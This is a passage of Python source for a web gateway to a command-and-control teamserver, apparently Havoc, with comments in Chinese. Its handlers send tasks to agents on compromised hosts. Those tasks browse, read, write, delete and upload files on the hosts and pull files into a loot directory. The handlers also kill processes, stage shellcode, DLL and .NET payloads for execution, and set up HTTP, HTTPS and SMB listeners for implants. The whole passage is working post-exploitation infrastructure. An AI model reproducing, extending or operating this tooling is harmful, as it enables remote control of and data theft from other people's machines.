            reg = self.builtin_commands.get(name)
            module_meta = MODULE_BY_NAME.get(name) or self.state.python_modules.get(name) or {}
            subs = [s.get("command", "") for s in (meta or {}).get("subcommands", [])]
            sub_meta = {
                s.get("command", ""): {
                    "description": sub_description_for(name, s.get("command", ""), s.get("description", "")),
                    "usage": s.get("usage", ""),
                    "example": s.get("example", ""),
                    "behavior": s.get("behavior", ""),
                }
                for s in (meta or {}).get("subcommands", [])
            }
            for item in REGISTERED_COMMANDS:
                if item.get("module") == name:
                    if item.get("command") not in subs:
                        subs.append(item.get("command", ""))
                    sub_meta.setdefault(item.get("command", ""), {
                        "description": sub_description_for(name, item.get("command", ""), item.get("description", "")),
                        "usage": item.get("usage", ""),
                        "example": item.get("example", ""),
                        "behavior": item.get("behavior", ""),
                    })
            if not subs and module_meta:
                subs = [c["command"] for c in REGISTERED_COMMANDS if c.get("module") == name]
            rows.append({
                "name": name,
                "type": typ,
                "description": desc,
                "usage": (meta or module_meta).get("usage", ""),
                "example": (meta or module_meta).get("example", ""),
                "module": bool((meta or {}).get("module") or module_meta),
                "subcommands": [s for s in subs if s],
                "subcommand_meta": sub_meta,
                "recorded": bool(reg),
                "script": (reg or {}).get("script", ""),
            })
        return web.json_response({"commands": rows})

    # ---------------- 命令 ----------------

    async def dispatch_command(self, sid: str, line: str, source: str = "web",
                               user: str = "", task_id: Optional[str] = None,
                               plan: Optional[dict] = None) -> dict:
        """把一行控制台命令构造为 teamserver 任务；供 Web / Python SDK 复用。"""
        session = self.state.sessions.get(sid)
        if not session:
            raise CommandError("会话不存在")
        if not self.client.connected:
            raise ConnectionError("网关未连接 teamserver")
        try:
            first_arg = parse_argv(line)
            if first_arg and first_arg[0].lower() == "cd":
                self.fileman.invalidate_cwd(sid)
        except Exception:
            pass
        raw = self.state.session_raw.get(sid, {})
        agent_commands = raw.get("Commands") or raw.get("commands") or []
        agent_type = str(raw.get("AgentType") or raw.get("agent") or "Demon")
        ref = SessionRef(name=sid, os=session.get("os", ""), platform=session.get("platform", ""),
                         arch=session.get("proc_arch", ""),
                         user=session.get("user", ""), host=session.get("host", ""),
                         agent_type=agent_type, commands=agent_commands)
        task_id = task_id or f"{secrets.randbits(32):08X}"
        if plan is None:
            plan = linux_compat.plan(session, line)
        if plan and plan.get("kind") == "error":
            # Linux 会话上的 Windows 原生命令：不下发（agent 不会回包）
            raise CommandError(plan.get("message") or linux_compat.unsupported_message(line))
        build_line = plan["line"] if plan else line
        built = build(ref, build_line, task_id, shell_utf8=self.shell_utf8)
        if plan:
            built.note = plan.get("note") or built.note
            built.message = plan.get("message") or built.message
        try:
            await self.client.send_command(built.info)
        except Exception as exc:
            raise ConnectionError(f"下发失败：{exc}") from exc
        task = self.state.new_task(sid, line, str(built.info.get("CommandID", "")), task_id, built.note)
        self._note_delivery_command(sid, line, task_id)
        if built.message:
            self.state.console_append(sid, "info", f"[*] [{task_id}] {built.message}", task_id)
        self.state.add_event(f"[{user or source}] 在 {sid} 执行：{line}", "info", source="operator")
        log.info("command sent demon=%s task=%s cmd=%r (source=%s)", sid, task_id, line, source)
        return task.to_dict()

    @staticmethod
    def _command_usage(name: str) -> str:
        """取一条命令的 usage 字符串（静态命令 / 模块 / 注册命令）。"""
        low = (name or "").lower()
        meta = STATIC_BY_NAME.get(low) or {}
        usage = str(meta.get("usage") or "").strip()
        if usage:
            return usage
        for mod in MODULE_BY_NAME.values():
            if str(mod.get("name", "")).lower() == low:
                return str(mod.get("usage") or "").strip()
        for cmd in REGISTERED_COMMANDS:
            if str(cmd.get("command", "")).lower() == low:
                return str(cmd.get("usage") or "").strip()
        return ""

    def _usage_message(self, argv: list[str], message: str) -> str:
        """参数不足/过多时，在错误后面补上用法和 `help` 提示。"""
        if not argv:
            return message
        low = message.lower()
        if not any(k in low for k in ("not enough", "argument", "parameter", "usage", "invalid", "missing")):
            return message
        usage = self._command_usage(argv[0])
        if not usage:
            return message
        return (f"{message}\n用法：{argv[0]} {usage}\n"
                f"提示：输入 {argv[0]} help 查看完整用法")

    async def api_send_command(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        session = self.state.sessions.get(sid)
        if not session:
            return web.json_response({"error": "not_found", "message": "会话不存在"}, status=404)
        if not self.client.connected:
            return web.json_response(
                {"error": "disconnected", "message": "网关未连接 teamserver，暂时无法下发命令"}, status=503)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request", "message": "请求格式错误"}, status=400)
        line = str(body.get("command", "")).strip()
        if not line:
            return web.json_response({"error": "bad_request", "message": "命令为空"}, status=400)

        argv = parse_argv(line)
        first = argv[0].lower() if argv else ""

        platform = "linux" if linux_compat.is_linux(session) else ""
        if first == "help" or (first == "?" and len(argv) == 1):
            if len(argv) == 1:
                text = self._help_text(platform)
            else:
                text = render_command_help(argv[1], argv[2] if len(argv) > 2 else None,
                                           self.state.python_commands.values(),
                                           self.state.python_modules.values(),
                                           platform=platform)
            self.state.console_append(sid, "prompt", line)
            self.state.console_append(sid, "output", text)
            return web.json_response({"ok": True, "help": text})
        if first == "clear" and len(argv) == 1:
            self.state.console[sid].clear()
            self.state.publish({"type": "console_clear", "demon": sid})
            return web.json_response({"ok": True})

        # `<command> help` 与 `help <command>` 等价：缺参数时可以直接查用法
        # （例如 `klist help`、`config help`、`kerberoast help`）。
        # 只有第一个参数本身是路径/查询语句的命令例外（`cat help` 仍然是读 help 文件）。
        if len(argv) >= 2 and argv[1].lower() == "help" and argv[0].lower() not in HELP_FREEFORM:
            text = render_command_help(argv[0], argv[2] if len(argv) > 2 else None,
                                       self.state.python_commands.values(),
                                       self.state.python_modules.values(),
                                       platform=platform)
            if text.strip() and "Couldn't find command" not in text:
                self.state.console_append(sid, "prompt", line)
                self.state.console_append(sid, "output", text)
                return web.json_response({"ok": True, "help": text})

        # 只给了模块名（jump-exec）而没有子命令：客户端提示相同错误
        if argv and len(argv) == 1 and (argv[0] in MODULE_BY_NAME or argv[0] in self.state.python_modules):
            message = "Specify a sub command for the given module."
            self.state.console_append(sid, "error", message)
            return web.json_response({"error": "invalid_command", "message": message}, status=400)

        plan = linux_compat.plan(session, line)
        # Linux 会话 + Windows 原生命令：网关侧短路（agent 对这些 CommandID 不回包，
        # 下发会让会话一直占满到超时）。口径与 agent 的 0x14 回显一致。
        if plan and plan.get("kind") == "error":
            message = plan.get("message") or linux_compat.unsupported_message(line)
            self.state.console_append(sid, "prompt", line)
            self.state.console_append(sid, "error", message)
            self.state.add_event(f"[{request['user']}] 在 {sid} 执行（不支持）：{line}",
                                 "warn", source="operator")
            return web.json_response({"error": "not_supported", "message": message,
                                      "platform": "linux",
                                      "command": argv[0] if argv else ""}, status=400)
        matched = None if plan else self._match_python_command(line)
        if matched:
            rest = line[len(matched["key"]):].strip()
            try:
                args = shlex.split(rest) if rest else []
            except ValueError as exc:
                message = f"命令解析失败：{exc}"
                self.state.console_append(sid, "error", message)
                return web.json_response({"error": "invalid_command", "message": message}, status=400)
            task_id = f"{secrets.randbits(32):08X}"
            task = self.state.new_task(sid, line, "python", task_id, note="Python 脚本命令")
            asyncio.create_task(self._run_python_command(matched, sid, args))
            self.state.add_event(f"[{request['user']}] 在 {sid} 执行 Python 命令：{line}", "info", source="operator")
            return web.json_response({"ok": True, "task": task.to_dict(), "python": True})

        try:
            task = await self.dispatch_command(sid, line, source="web", user=request["user"], plan=plan)
        except CommandError as exc:
            message = self._usage_message(argv, str(exc))
            self.state.console_append(sid, "error", message)
            return web.json_response({"error": "invalid_command", "message": message,
                                      "help": self._help_text()}, status=400)
        except ConnectionError as exc:
            self.state.console_append(sid, "error", str(exc))
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        return web.json_response({"ok": True, "task": task})

    def _help_text(self, platform: str = "") -> str:
        text = render_help(self.state.python_commands.values(), self.state.python_modules.values(),
                           platform=platform)
        if platform == "linux":
            text = linux_compat.help_note() + "\n" + text
        return text

    # ---------------- 聊天 / 文件 / 进程 / 战利品 / 监听器 ----------------

    async def api_chat(self, request: web.Request) -> web.Response:
        return web.json_response({"messages": list(self.state.chat)[-200:]})

    async def api_chat_send(self, request: web.Request) -> web.Response:
        if not self.client.connected:
            return web.json_response({"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        message = str(body.get("message", "")).strip()
        if not message:
            return web.json_response({"error": "bad_request", "message": "消息为空"}, status=400)
        if len(message) > 4000:
            return web.json_response({"error": "bad_request", "message": "消息过长"}, status=400)
        info = {self.client.user: base64.b64encode(message.encode()).decode()}
        try:
            await self.client.send_package(4, 1, info)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        return web.json_response({"ok": True})

    async def api_files_list(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        if sid not in self.state.sessions:
            return web.json_response({"error": "not_found", "message": "会话不存在"}, status=404)
        try:
            body = await request.json()
        except Exception:
            body = {}
        path = str(body.get("path") or "").strip() or "."
        try:
            result = await self.fileman.list_dir(sid, path)
        except FileOpError as exc:
            return self._fs_error(exc)
        return web.json_response({"ok": True, "path": result["path"], "entries": result["entries"]})

    @staticmethod
    def _fs_error(exc: FileOpError) -> web.Response:
        payload = {"error": "file_operation_failed", "message": str(exc)}
        if exc.detail:
            payload["detail"] = exc.detail
        return web.json_response(payload, status=exc.status)

    async def _fs_body(self, request: web.Request) -> dict:
        try:
            body = await request.json()
        except Exception:
            return {}
        return body if isinstance(body, dict) else {}

    async def api_files_mkdir(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        body = await self._fs_body(request)
        path = str(body.get("path") or "").strip()
        if not path:
            return web.json_response({"error": "bad_request", "message": "路径不能为空"}, status=400)
        try:
            result = await self.fileman.mkdir(sid, path)
        except FileOpError as exc:
            return self._fs_error(exc)
        self.state.add_event(f"[{request['user']}] 在 {sid} 新建目录：{result['path']}",
                             "info", source="operator")
        return web.json_response({"ok": True, **result})

    async def api_files_remove(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        body = await self._fs_body(request)
        path = str(body.get("path") or "").strip()
        if not path:
            return web.json_response({"error": "bad_request", "message": "路径不能为空"}, status=400)
        recursive = bool(body.get("recursive", False))
        try:
            result = await self.fileman.remove(sid, path, recursive=recursive)
        except FileOpError as exc:
            return self._fs_error(exc)
        self.state.add_event(
            f"[{request['user']}] 在 {sid} 删除{'目录' if result.get('directory') else '文件'}：{result['path']}",
            "warn", source="operator")
        return web.json_response({"ok": True, **result})

    async def api_files_move(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        body = await self._fs_body(request)
        src = str(body.get("from") or "").strip()
        dst = str(body.get("to") or "").strip()
        if not src or not dst:
            return web.json_response({"error": "bad_request", "message": "源路径和目标路径都必填"}, status=400)
        try:
            result = await self.fileman.move(sid, src, dst,
                                             overwrite=bool(body.get("overwrite", False)))
        except FileOpError as exc:
            return self._fs_error(exc)
        self.state.add_event(f"[{request['user']}] 在 {sid} 移动/重命名：{result['from']} → {result['to']}",
                             "info", source="operator")
        return web.json_response({"ok": True, **result})

    async def api_files_copy(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        body = await self._fs_body(request)
        src = str(body.get("from") or "").strip()
        dst = str(body.get("to") or "").strip()
        if not src or not dst:
            return web.json_response({"error": "bad_request", "message": "源路径和目标路径都必填"}, status=400)
        try:
            result = await self.fileman.copy(sid, src, dst,
                                             overwrite=bool(body.get("overwrite", False)))
        except FileOpError as exc:
            return self._fs_error(exc)
        self.state.add_event(f"[{request['user']}] 在 {sid} 复制：{result['from']} → {result['to']}",
                             "info", source="operator")
        return web.json_response({"ok": True, **result})

    async def api_files_write(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        body = await self._fs_body(request)
        path = str(body.get("path") or "").strip()
        if not path:
            return web.json_response({"error": "bad_request", "message": "路径不能为空"}, status=400)
        if "content_b64" in body:
            try:
                data = base64.b64decode(str(body.get("content_b64") or ""), validate=True)
            except Exception:
                return web.json_response({"error": "bad_request", "message": "content_b64 不是合法 Base64"}, status=400)
        else:
            content = body.get("content")
            if content is None:
                content = ""
            if not isinstance(content, (str, int, float, bool)):
                return web.json_response({"error": "bad_request", "message": "content 必须是字符串"}, status=400)
            try:
                data = self.fileman.encode_text(str(content), str(body.get("encoding") or "utf-8"))
            except FileOpError as exc:
                return self._fs_error(exc)
        if len(data) > 32 * 1024 * 1024:
            return web.json_response({"error": "too_large", "message": "文件超过 32 MiB 上限"}, status=413)
        try:
            result = await self.fileman.write(sid, path, data, overwrite=True)
        except FileOpError as exc:
            return self._fs_error(exc)
        self.state.add_event(f"[{request['user']}] 在 {sid} 写入文件：{result['path']}（{len(data)} 字节）",
                             "info", source="operator")
        return web.json_response({"ok": True, "path": result["path"], "size": len(data),
                                  "message": result.get("message", ""),
                                  "backup": result.get("backup"),
                                  "warning": result.get("warning")})

    async def api_files_read(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        path = str(request.query.get("path") or "").strip()
        if not path:
            return web.json_response({"error": "bad_request", "message": "path 必填"}, status=400)
        try:
            limit = int(request.query.get("max") or EDIT_MAX_BYTES)
        except ValueError:
            limit = EDIT_MAX_BYTES
        try:
            result = await self.fileman.read_text(sid, path, limit=limit)
        except FileOpError as exc:
            return self._fs_error(exc)
        return web.json_response({"ok": True, **result})

    async def api_files_download(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        path = str(request.query.get("path") or "").strip()
        if not path:
            return web.json_response({"error": "bad_request", "message": "path 必填"}, status=400)
        try:
            result = await self.fileman.download(sid, path)
        except FileOpError as exc:
            return self._fs_error(exc)
        local = Path(result["local_path"]).resolve()
        try:
            local.relative_to(self.state.loot_dir.resolve())
        except ValueError:
            return web.json_response({"error": "forbidden", "message": "非法下载路径"}, status=403)
        filename = result["name"] or local.name
        disposition = f"attachment; filename*=UTF-8''{quote(filename)}"
        return web.FileResponse(local, headers={
            "Content-Disposition": disposition,
            "Cache-Control": "no-store",
        })

    async def api_files_upload(self, request: web.Request) -> web.Response:
        """浏览器文件直传目标会话（multipart: path + file...）。"""
        sid = request.match_info["sid"]
        if sid not in self.state.sessions:
            return web.json_response({"error": "not_found", "message": "会话不存在"}, status=404)
        if not request.content_type.startswith("multipart/"):
            return web.json_response({"error": "bad_request", "message": "需要 multipart 上传"}, status=400)
        session = self.state.sessions[sid]
        reader = await request.multipart()
        remote_dir = "."
        files: list[tuple[str, bytes]] = []
        try:
            while True:
                field = await reader.next()
                if field is None:
                    break
                if field.name == "path":
                    remote_dir = (await field.read()).decode("utf-8", "replace").strip() or "."
                elif field.name in ("file", "upload", "files"):
                    if not field.filename:
                        continue
                    name = Path(str(field.filename).replace("\\", "/")).name
                    if name in ("", ".", "..") or any(ch in name for ch in ("\x00", "\n", "\r")):
                        return web.json_response({"error": "bad_request", "message": "文件名无效"}, status=400)
                    if not linux_compat.is_linux(session):
                        name = re.sub(r'[<>:"|?*]+', "_", name).strip(" .") or "upload.bin"
                    chunks: list[bytes] = []
                    size = 0
                    while True:
                        chunk = await field.read_chunk(256 * 1024)
                        if not chunk:
                            break
                        size += len(chunk)
                        if size > 32 * 1024 * 1024:
                            return web.json_response({"error": "too_large",
                                                      "message": f"{name} 超过 32 MiB 上限"}, status=413)
                        chunks.append(chunk)
                    files.append((name, b"".join(chunks)))
        except Exception as exc:  # noqa: BLE001
            log.warning("remote upload parse failed: %s", exc)
            return web.json_response({"error": "upload_failed", "message": str(exc)}, status=400)
        if not files:
            return web.json_response({"error": "bad_request", "message": "缺少文件字段"}, status=400)
        uploaded = []
        for name, data in files:
            target = self.fileman.join_path(session, remote_dir, name)
            try:
                result = await self.fileman.write(sid, target, data, overwrite=True)
            except FileOpError as exc:
                return web.json_response({
                    "error": "file_operation_failed",
                    "message": f"{name}: {exc}",
                    "detail": exc.detail,
                    "uploaded": uploaded,
                }, status=exc.status)
            uploaded.append({"name": name, "path": result["path"], "size": len(data)})
            self.state.add_event(f"[{request['user']}] 上传文件到 {sid}：{result['path']}（{len(data)} 字节）",
                                 "info", source="operator")
        return web.json_response({"ok": True, "uploaded": uploaded})

    async def api_upload(self, request: web.Request) -> web.Response:
        """把浏览器选择的本地文件保存到 data/uploads/<demon>/，返回服务器路径。

        控制台里的 inline-execute / dll / shellcode / dotnet / upload 使用该路径。
        """
        sid = request.match_info["sid"]
        if sid not in self.state.sessions:
            return web.json_response({"error": "not_found", "message": "会话不存在"}, status=404)
        if not self.python_enabled:
            return web.json_response({"error": "disabled", "message": "文件上传已禁用"}, status=403)
        if not request.content_type.startswith("multipart/"):
            return web.json_response({"error": "bad_request", "message": "需要 multipart 上传"}, status=400)
        try:
            reader = await request.multipart()
            field = await reader.next()
            while field is not None and field.name not in ("file", "upload"):
                field = await reader.next()
            if field is None or not getattr(field, "filename", None):
                return web.json_response({"error": "bad_request", "message": "缺少文件字段"}, status=400)
            raw_name = Path(str(field.filename).replace("\\", "/")).name
            safe = re.sub(r"[^A-Za-z0-9._\-\u4e00-\u9fff]+", "_", raw_name).strip("._") or "upload.bin"
            target_dir = UPLOAD_DIR / re.sub(r"[^A-Za-z0-9._-]+", "_", sid)
            target_dir.mkdir(parents=True, exist_ok=True)
            target = target_dir / safe
            if target.exists():
                stem, suffix = target.stem, target.suffix
                counter = 1
                while target.exists():
                    target = target_dir / f"{stem}-{counter}{suffix}"
                    counter += 1
            size = 0
            with target.open("wb") as fh:
                while True:
                    chunk = await field.read_chunk(256 * 1024)
                    if not chunk:
                        break
                    size += len(chunk)
                    if size > 64 * 1024 * 1024:
                        fh.close()
                        target.unlink(missing_ok=True)
                        return web.json_response({"error": "too_large", "message": "文件超过 64 MiB"}, status=413)
                    fh.write(chunk)
        except Exception as exc:
            log.warning("upload failed: %s", exc)
            return web.json_response({"error": "upload_failed", "message": str(exc)}, status=500)
        self.state.add_event(f"[{request['user']}] 上传文件到 {sid}：{safe}（{size} 字节）",
                             "info", source="operator")
        return web.json_response({"ok": True, "path": str(target), "name": target.name, "size": size})

    async def _send_fs_dir(self, demon: str, path: str) -> web.Response:
        if not self.client.connected:
            return web.json_response({"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)
        task_id = f"{secrets.randbits(32):08X}"
        info = {
            "TaskID": task_id,
            "CommandLine": f"dir {path}",
            "DemonID": demon,
            "AgentType": "Demon",
            "CommandID": "15",
            "SubCommand": "dir;ui",
            "Arguments": path,
        }
        try:
            await self.client.send_command(info)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        return web.json_response({"ok": True, "task_id": task_id, "path": path})

    async def api_procs_list(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        if sid not in self.state.sessions:
            return web.json_response({"error": "not_found"}, status=404)
        if not self.client.connected:
            return web.json_response({"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)
        task_id = f"{secrets.randbits(32):08X}"
        info = {
            "TaskID": task_id,
            "CommandLine": "ps",
            "DemonID": sid,
            "AgentType": "Demon",
            "CommandID": "12",
            "FromProcessManager": "true",
        }
        try:
            await self.client.send_command(info)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        return web.json_response({"ok": True, "task_id": task_id})

    async def api_proc_kill(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        if sid not in self.state.sessions:
            return web.json_response({"error": "not_found"}, status=404)
        if not self.client.connected:
            return web.json_response({"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        pid = str(body.get("pid", "")).strip()
        if not pid.isdigit():
            return web.json_response({"error": "bad_request", "message": "PID 无效"}, status=400)
        task_id = f"{secrets.randbits(32):08X}"
        info = {
            "TaskID": task_id,
            "CommandLine": f"proc kill {pid}",
            "DemonID": sid,
            "AgentType": "Demon",
            "CommandID": "4112",
            "ProcCommand": "7",
            "Args": pid,
        }
        try:
            await self.client.send_command(info)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        self.state.new_task(sid, f"proc kill {pid}", "4112", task_id)
        return web.json_response({"ok": True, "task_id": task_id})

    async def api_mark_session(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        if sid not in self.state.sessions:
            return web.json_response({"error": "not_found"}, status=404)
        if not self.client.connected:
            return web.json_response({"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)
        try:
            body = await request.json()
        except Exception:
            body = {}
        marked = "Alive" if str(body.get("marked", "Alive")).lower() in ("alive", "true", "1") else "Dead"
        try:
            await self.client.send_package(7, 5, {"AgentID": sid, "Marked": marked})
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        self.state.add_event(f"操作员将 {sid} 标记为 {marked}", "warn", source="operator")
        return web.json_response({"ok": True, "marked": marked})

    async def api_session_exit(self, request: web.Request) -> web.Response:
        """会话右键「退出 ▸ 线程/进程」：与客户端一致，向 Demon 下发 exit 命令。"""
        sid = request.match_info["sid"]
        session = self.state.sessions.get(sid)
        if not session:
            return web.json_response({"error": "not_found", "message": "会话不存在"}, status=404)
        if str(session.get("magic", "")) != "deadbeef":
            return web.json_response(
                {"error": "bad_request", "message": "只有 Demon 会话支持 exit 命令"}, status=400)
        if not self.client.connected:
            return web.json_response(
                {"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)
        try:
            body = await request.json()
        except Exception:
            body = {}
        method = str(body.get("method", "")).strip().lower()
        if method not in ("thread", "process"):
            return web.json_response(
                {"error": "bad_request", "message": "method 必须是 thread 或 process"}, status=400)
        try:
            task = await self.dispatch_command(
                sid, f"exit {method}", source="web", user=request["user"])
        except CommandError as exc:
            return web.json_response({"error": "invalid_command", "message": str(exc)}, status=400)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        self.state.add_event(f"操作员请求 {sid} 退出（{method}）", "warn", source="operator")
        return web.json_response({"ok": True, "task": task})

    async def api_session_remove(self, request: web.Request) -> web.Response:
        """会话右键「移除会话」：仅从 Web 本地列表/拓扑中移除，不等于 teamserver 踢下线。"""
        sid = request.match_info["sid"]
        existed = self.state.hide_session(sid)
        self.state.add_event(
            f"操作员从 Web 控制台移除会话 {sid}（未向 teamserver 发送下线命令）", "warn", source="operator")
        return web.json_response({"ok": True, "id": sid, "hidden": True, "existed": existed})

    async def api_set_delivery_parent(self, request: web.Request) -> web.Response:
        """手动设置/清除 Web 投递链（仅影响 Web 拓扑虚线，不改 teamserver PivotParent）。"""
        sid = request.match_info["sid"]
        if sid not in self.state.sessions:
            return web.json_response({"error": "not_found", "message": "会话不存在"}, status=404)
        try:
            body = await request.json()
        except Exception:
            body = {}
        parent = str((body or {}).get("parent") or "").strip()
        user = str(request.get("user") or "operator")
        if not parent:
            cleared = self.state.clear_delivery_edge(sid)
            self.state.add_event(f"[{user}] 清除 {sid} 的投递父会话", "info", source="operator")
            return web.json_response({"ok": True, "delivery_parent": "", "cleared": cleared})
        try:
            record = self.state.set_delivery_edge(sid, parent, source="manual")
        except ValueError as exc:
            return web.json_response({"error": "bad_request", "message": str(exc)}, status=400)
        self.state.add_event(f"[{user}] 设置投递链：{parent} → {sid}", "info", source="operator")
        return web.json_response({"ok": True, "delivery_parent": parent, "delivery": record})

    async def api_listener_add(self, request: web.Request) -> web.Response:
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        mode = normalize_mode(body.get("mode") or body.get("protocol", ""))
        name = str(body.get("name", "")).strip()
        if not name:
            return web.json_response({"error": "bad_request", "message": "监听器名称必填"}, status=400)
        if mode in TRANSPORT_MODES:
            if name in self.state.listeners or name in self.transports.configs:
                return web.json_response({"error": "conflict", "message": "同名监听器已存在"}, status=409)
            cfg = None
            try:
                cfg = self.transports.add({**body, "name": name, "mode": mode})
                await self.transports.start(name)
            except Exception as exc:
                if cfg is not None:
                    try:
                        await self.transports.remove(name)
                    except Exception:
                        pass
                return web.json_response({"error": "bad_request", "message": str(exc)}, status=400)
            return web.json_response({"ok": True, "listener": self._transport_ui(name)})

        if not self.client.connected:
            return web.json_response({"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)

        # 服务/插件注册的自定义监听器：协议名和字段都来自 EV_SERVICE/SubEvent=2，
        # 不能按原生 HTTP/HTTPS/SMB/External 处理，原样透传字段给服务端插件。
        service = self.state.find_service_listener(str(body.get("protocol", "")))
        if service is not None:
            return await self._add_service_listener(body, service, name)

        payload = self._listener_info(body)
        protocol = payload["Protocol"]
        if protocol not in ("Http", "Https", "Smb", "External"):
            return web.json_response({"error": "bad_request", "message": "不支持的监听器协议"}, status=400)
        if protocol == "Smb" and (not payload.get("PipeName") or "\\" in payload["PipeName"]):
            return web.json_response({"error": "bad_request",
                                      "message": r"SMB 监听器需要管道名称（不要包含 \\.\pipe\ 前缀或反斜杠）"}, status=400)
        if protocol == "External":
            endpoint = payload.get("Endpoint", "")
            if not endpoint or "/" in endpoint:
                return web.json_response({"error": "bad_request",
                                          "message": "External 端点必须是单个路径段（如 external，不含 /）"}, status=400)
            for item in self.state.listeners.values():
                if item.get("protocol") == "External" and item.get("endpoint") == endpoint:
                    return web.json_response({"error": "conflict", "message": "该 External 端点已被注册"}, status=409)
        if name in self.transports.configs:
            return web.json_response({"error": "conflict", "message": "同名传输监听器已存在"}, status=409)
        try:
            await self.client.send_package(2, 1, payload)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        # teamserver 用 Listener.Add 事件作为回执；等待片刻确认，避免连接抖动时“假成功”
        if not await self._wait_listener(payload["Name"], 2.5):
            return web.json_response({
                "error": "no_ack",
                "message": "teamserver 未确认监听器创建（连接可能不稳定，请稍后重试或检查 teamserver 日志）",
            }, status=502)
        self.state.add_event(f"操作员创建监听器 {payload['Name']}（{payload['Protocol']}）",
                             "info", source="operator")
        return web.json_response({"ok": True})

    async def _wait_listener(self, name: str, timeout: float = 2.5) -> bool:
        deadline = asyncio.get_running_loop().time() + max(0.2, timeout)
        while asyncio.get_running_loop().time() < deadline:
            if name in self.state.listeners:
                return True
            await asyncio.sleep(0.1)
        return False

    async def _add_service_listener(self, body: dict, service: dict, name: str) -> web.Response:
        """把 Web 表单提交给服务端插件注册的自定义监听器协议。

        与 Qt 客户端 ListenerCustomAdd/onButton_Save 的报文保持一致：
        {Name, Protocol, ClientUser, <item.name>: <value>...}。
        """
        if name in self.state.listeners or name in self.transports.configs:
            return web.json_response({"error": "conflict", "message": "同名监听器已存在"}, status=409)
        protocol = str(service.get("name", "")).strip()
        payload: dict = {
            "Name": name,
            "Protocol": protocol,
            "Status": "online",
            "ClientUser": str(self.state.connection.get("user") or body.get("client_user") or ""),
        }
        for item in service.get("items") or []:
            field = str(item.get("name", "")).strip()
            if not field:
                continue
            value = body.get(field, "")
            if isinstance(value, list):
                value = ", ".join(str(v).strip() for v in value if str(v).strip())
            text = str(value if value is not None else "").strip()
            if item.get("required") and not text:
                label = str(item.get("text") or field)
                return web.json_response({"error": "bad_request", "message": f"字段「{label}」必填"},
                                         status=400)
            payload[field] = text
        try:
            await self.client.send_package(2, 1, payload)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        # 服务端会向插件发送 ListenerStart；插件回执后 teamserver 广播 Listener.Add
        if not await self._wait_listener(name, 2.5):
            return web.json_response({
                "error": "no_ack",
                "message": "服务端插件未确认监听器创建（检查插件连接 / teamserver 日志）",
            }, status=502)
        self.state.add_event(f"操作员创建监听器 {name}（{protocol} · 服务插件）",
                             "info", source="operator")
        return web.json_response({"ok": True, "listener": self.state.listeners.get(name)})

    async def api_listener_edit(self, request: web.Request) -> web.Response:
        name = request.match_info["name"]
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        if name in self.transports.configs:
            try:
                self.transports.update(name, body)
                if name in self.transports.servers:
                    await self.transports.stop(name)
                    await self.transports.start(name)
            except Exception as exc:
                return web.json_response({"error": "bad_request", "message": str(exc)}, status=400)
            return web.json_response({"ok": True, "listener": self._transport_ui(name)})

        if not self.client.connected:
            return web.json_response({"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)
        existing = self.state.listeners.get(name, {})
        if self.state.find_service_listener(str(existing.get("protocol", ""))) is not None:
            return web.json_response({
                "error": "bad_request",
                "message": "服务端插件注册的监听器不支持在线编辑（teamserver 仅实现 HTTP 编辑），请删除后重建",
            }, status=400)
        if str(existing.get("protocol", "")).lower() in ("smb", "external"):
            return web.json_response({"error": "bad_request",
                                      "message": "SMB/External 监听器不支持在线编辑，请删除后重建"}, status=400)
        payload = self._listener_info(body)
        if payload["Protocol"] not in ("Http", "Https"):
            return web.json_response({"error": "bad_request", "message": "当前仅支持编辑 Http/Https"}, status=400)
        payload["Name"] = name
        try:
            await self.client.send_package(2, 2, payload)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        return web.json_response({"ok": True})

    def _listener_info(self, body: dict) -> dict:
        def s(key: str, default: str = "") -> str:
            return str(body.get(key, default))

        def flag(key: str, default: str = "false") -> str:
            return "true" if str(body.get(key, default)).lower() in ("true", "1", "yes", "on") else "false"

        raw_protocol = s("protocol", "Http").strip().lower()
        protocol = {"http": "Http", "https": "Https", "smb": "Smb",
                    "external": "External"}.get(raw_protocol, s("protocol", "Http").strip().title())
        name = s("name").strip()
        if protocol == "Smb":
            pipe = s("pipe_name").strip()
            for prefix in ("\\\\.\\pipe\\", "\\\\.\\pipe", "\\pipe\\"):
                if pipe.lower().startswith(prefix.lower()):
                    pipe = pipe[len(prefix):]
                    break
